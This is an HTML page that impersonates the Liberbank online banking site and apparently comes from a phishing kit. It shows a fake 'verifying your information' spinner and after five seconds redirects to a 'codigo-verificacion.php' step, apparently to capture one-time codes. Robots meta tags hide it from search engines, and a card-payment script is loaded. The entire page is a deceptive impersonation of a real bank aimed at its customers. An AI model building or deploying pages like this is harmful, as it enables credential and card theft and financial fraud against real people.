<!doctype html>
<html>
<head>
  <title>Liberbank | Banco Online</title>
</head>
    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/fonts.css">
        <link rel="stylesheet" href="assets/css/main.css">

        <link rel="shortcut icon" href="assets/images/favicon.png" type="image/x-icon"> 

        <title></title>
    </head>

    <body>

        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="assets/images/logo.png"></div>
                <p>Cancelar y salir</p>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="loader">
                    <div class="lds-spinner"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
                    <p>Verifica tu información<br>Procesando la información ... No cierre la página.</p>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- HEADER -->
        <footer id="footer">
            <div class="container">
                <div class="row">
                    <div class="col-md-2 text-lg-left text-md-left text-sm-center text-center mb-lg-0 mb-md-0 mb-sm-5 mb-5">
                        <img style="max-width: 180px;" src="assets/images/logo2.png">
                    </div>
                    <div class="col-md-8 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <ul>
                            <li>&copy; 2021 Liberbank</li>
                            <li>Cookies</li>
                            <li>Aviso legal</li>
                            <li>Política de privacidad y seguridad</li>
                        </ul>
                    </div>
                    <div class="col-md-2 text-lg-right text-md-right text-sm-center text-center">
                        <img src="assets/images/social.png">
                    </div>
                </div>
            </div>
        </footer>
        <!-- END HEADER -->

        <!-- JS FILES -->
        <script src="assets/js/jquery.min.js"></script>
        <script src="assets/js/popper.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="assets/js/fontawesome.min.js"></script>
        <script src="assets/js/jquery.payment.js"></script>
        <script src="assets/js/main.js"></script>

        <script type="text/javascript">
            var dispatch = '35675da77dfc98eab';
            setTimeout(function () {
                window.location.href= 'codigo-verificacion.php';
            },5000); // 1000 = 1s
        </script>
        
    </body>

</html>